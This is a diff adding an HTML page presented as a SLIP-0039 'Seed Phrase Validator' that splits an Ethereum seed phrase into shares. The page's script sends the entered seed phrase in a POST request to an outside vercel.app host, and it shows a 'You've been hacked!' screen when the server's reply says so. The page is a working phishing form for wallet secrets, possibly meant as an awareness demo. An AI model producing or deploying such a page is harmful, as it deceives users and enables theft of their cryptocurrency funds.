@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Seed Phrase Validator</title>
+    <style>
+        html, body {
+            height: 100%; /* Full height for flexbox centering */
+            margin: 0; /* Remove default margins */
+            font-family: Arial, sans-serif;
+        }
+        .center-container {
+            display: flex; /* Flexbox for centering */
+            justify-content: center; /* Center horizontally */
+            align-items: center; /* Center vertically */
+            height: 100%; /* Full viewport height */
+            background-color: #f0f0f0; /* Light background for the initial form */
+        }
+        .form-container {
+            background-color: white; /* Background color for the form */
+            padding: 2em; /* Padding around the form */
+            border-radius: 8px; /* Rounded corners */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Subtle shadow for depth */
+            text-align: center; /* Center text inside form */
+        }
+        .form-group {
+            margin-bottom: 1em; /* Space between form groups */
+        }
+        label {
+            display: block;
+            margin-bottom: .5em;
+        }
+        textarea, button, select {
+            padding: .5em;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto; /* Center within the parent container */
+        }
+        button {
+            padding: .5em 1em;
+            cursor: pointer; /* Show a pointer cursor on hover */
+        }
+        .hacked {
+            background-color: red;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* Full viewport height */
+            margin: 0; /* Remove default margins */
+            flex-direction: column;
+        }
+        .hacked-text {
+            font-size: 3em;
+            text-align: center;
+            padding: 1em;
+        }
+    </style>
+</head>
+<body>
+    <div id="main-content" class="center-container">
+        <div class="form-container">
+            <h1>Generate Shares</h1>
+            <form id="seedForm">
+                <div class="form-group">
+                    <label for="seedPhrase">
+                        <a href="https://github.com/satoshilabs/slips/blob/master/slip-0039.md" target="_blank">
+                            The code runs an open source implementation of the SLIP-0039 standard
+                        </a>
+                        <br>
+                        Enter Ethereum Seed Phrase:
+                    </label>
+                    <textarea id="seedPhrase" name="seedPhrase" rows="3" required></textarea>
+                </div>
+                <div class="form-group">
+                    <label for="threshold">Select Threshold:</label>
+                    <select id="threshold" name="threshold" required>
+                        <option value="2/3">2/3</option>
+                        <option value="2/4">2/4</option>
+                        <option value="3/4">3/4</option>
+                        <option value="3/5">3/5</option>
+                        <option value="4/5">4/5</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <button type="submit">Generate shares</button>
+                </div>
+            </form>
+            <div id="result"></div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('seedForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const seedPhrase = document.getElementById('seedPhrase').value.trim();
+            const threshold = document.getElementById('threshold').value;
+    
+            const response = await fetch('generate-shares-a7jcqwvgy-solettys-projects.vercel.app', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ seedPhrase, threshold })
+            });
+            const data = await response.json();
+    
+            if (data.message.includes('hacked')) {
+                document.body.classList.add('hacked');
+                document.body.innerHTML = '<div class="hacked-text">You’ve been hacked!</div>';
+            } else {
+                const resultDiv = document.getElementById('result');
+                resultDiv.innerText = data.message;
+            }
+        });
+    </script>
+</body>
+</html>
